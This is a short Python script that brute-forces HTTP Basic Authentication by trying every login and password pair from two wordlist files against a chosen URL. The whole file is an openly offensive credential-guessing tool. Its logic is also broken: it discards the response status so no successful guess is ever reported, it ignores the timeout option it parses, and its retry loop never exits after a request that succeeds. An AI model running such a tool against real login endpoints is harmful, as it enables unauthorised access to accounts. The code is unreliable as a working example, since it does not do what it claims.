__author__ = 'mwitas'
import argparse
import os.path
import sys
import socket
import requests.auth
import requests.exceptions

def connect(url, login, password, timeout):
    from requests.auth import HTTPBasicAuth

    try:
        r = requests.get(url, auth=HTTPBasicAuth(login, password), timeout=timeout, stream=True)
        r.close()
        return r.status_code

    except (requests.exceptions.ConnectionError, socket.timeout, requests.exceptions.ReadTimeout) as e:
        raise requests.exceptions.ConnectionError("Connection timeout")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("logins", help="File with logins. Every login in new line")
    parser.add_argument("passwords", help="File with passwords. Every password in new line")
    parser.add_argument("-r", dest="retry", help="Retry on connection error", action="store_true")
    parser.add_argument("-t", dest="timeout", help="Connection timeout in seconds", type=int, default=5)
    parser.add_argument("url", help="URL of endpoint to brute force")
    args = parser.parse_args()

    f_logins = args.logins
    f_passwords = args.passwords
    url = args.url

    should_exit = False

    if not os.path.isfile(f_logins):
        print("File %s does not exists." % f_logins)
        should_exit = True

    if not os.path.isfile(f_passwords):
        print("File %s does not exists." % f_passwords)
        should_exit = True

    if should_exit:
        sys.exit(1)

    n_logins = sum(1 for l in open(f_logins))
    n_passwords = sum(1 for l in open(f_passwords))

    d_logins = open(f_logins)
    d_passwords = open(f_passwords)


    for i, line in enumerate(d_logins):
        login = line[:-1]

        for j, line2 in enumerate(d_passwords):
            password = line2[:-1]

            head = str(i*n_passwords+j+1) + "/" + str(n_logins*n_passwords) + "\t" + login + ":" + password + "\t"

            should_retry = True
            while should_retry:
                try:
                    connect(url, login, password, 3)
                except requests.exceptions.ConnectionError:
                    print(head + "Connection error")
                    should_retry = args.retry

        d_passwords.seek(0)

    d_logins.close()
    d_passwords.close()

if __name__ == "__main__":
    main()